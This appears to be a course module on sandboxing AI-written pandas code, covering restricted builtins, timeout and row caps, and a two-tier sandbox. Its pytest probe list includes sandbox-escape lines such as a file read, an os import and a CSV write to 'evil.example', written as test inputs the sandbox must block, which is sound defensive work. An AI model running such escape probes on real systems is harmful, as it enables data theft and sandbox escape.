# Sandbox Discipline — Restricted Eval and Malicious Probes

**What you'll learn:** the CSV sandbox: model-written pandas runs under
`RestrictedPython`-style restrictions or subprocess isolation, with an
escape-drill suite sized for data exfiltration.

## 1. The restricted environment

```python
from restricted_eval import safe_exec   # or subprocess per W13 file 04-02

def run_in_sandbox(code: str, df) -> "pd.DataFrame":
    env = {
        "df": df,
        "pd": pd,
        "np": np,
        "__builtins__": {"min": min, "max": max, "len": len,
                          "sum": sum, "sorted": sorted, "range": range},
    }
    loc = {}
    safe_exec(code, env, loc)
    return loc.get("result")
```

| Restriction | Closes |
|---|---|
| minimal builtins | `open`, `eval`, `exec`, `__import__` |
| no `os`/`subprocess` modules | process and FS access |
| pandas/numpy only | the analysis surface, nothing else |

The restricted-exec approach trades generality for safety: the model
gets pandas, numpy, and five builtins — everything an analysis needs,
nothing an exfiltration wants. For anything the restriction blocks,
the fallback is the W13 subprocess/container sandbox.

## 2. The escape-drill suite (data-shaped probes)

```python
PROBES = [
    ("fs",       "result = open('data/checkpoints.db').read()"),
    ("import",   "result = __import__('os').listdir('.')"),
    ("exfil",    "result = df.to_csv('https://evil.example')"),
    ("resource", "result = df.copy().copy().copy()  # memory bomb"),
    ("infinite", "while True: pass"),
]

@pytest.mark.parametrize("name,code", PROBES)
def test_sandbox_contains(name, code):
    with pytest.raises(Exception):
        run_in_sandbox(code, df)
```

Five probes, five failure classes: file reads, imports, exfil-shaped
writes, memory bombs, infinite loops. The W13 drill set, extended for
the data domain — the CSV path's threat model is *your data*, so the
probes target it.

## 3. Timeout and size caps

```python
def guarded_run(code: str, df) -> str:
    import signal
    def handler(signum, frame):
        raise TimeoutError("pandas execution exceeded 10s")
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)                          # hard cap
    try:
        out = run_in_sandbox(code, df)
        if isinstance(out, pd.DataFrame) and len(out) > 1000:
            out = out.head(50)                # size cap on returned frames
        return out
    finally:
        signal.alarm(0)
```

| Cap | Value | Protects |
|---|---|---|
| execution time | 10 s | runaway groupbys |
| returned rows | 50 | context-window stuffing |
| memory | df copies bounded | OOM-by-copy |

## Exercises

1. Build the restricted environment; run the five probes; document which
   restriction catches each.
2. Timeout drill: feed a deliberately slow groupby; the alarm fires at
   10 s; the agent sees the timeout as an instructive error.
3. Size-cap drill: return a 100k-row frame; verify the 50-row cap and
   that the answer reports the true row count separately.

## 5. The sandbox pin note

**Task:** extend `reports/sdk-versions.md` with the CSV sandbox:
restriction mechanism (restricted-exec vs subprocess), probe count,
timeout/size caps, and the probe-drill command.

**Worked approach:** the CSV path has the sharpest boundary in the
program (user files + model code) — the pin note records which
containment level guarded it and when the probes last ran.

**Pass criterion:** note committed; the probe command green at the
recorded containment level.

## 6. The two-tier sandbox (production shape)

```python
def run_code(code: str, df, trust: str) -> str:
    if trust == "restricted":        # restricted-exec: pandas only
        return run_restricted(code, df)
    return run_subprocess(code, df)  # subprocess: full stdlib, capped
```

| Tier | Environment | When |
|---|---|---|
| restricted | pandas + 5 builtins | default for analysis code |
| subprocess | capped stdlib | when analysis legitimately needs more |

The two tiers let the capability dial move per trust level without
changing the guard suite — the probes run against *both* tiers, and the
drill's matrix records which tier catches which probe.

## Pitfalls

- `eval`-based sandboxes without builtin restrictions — `__import__`
  survives every regex; the restricted builtins are the wall.
- Probes that only test *your* guesses — add one probe per escape idea
  you would try as an attacker (file reads, then network-shaped writes).
- Timeout via thread cancellation — pandas won't yield; the signal-
  based (or process-based) kill is the only reliable stop.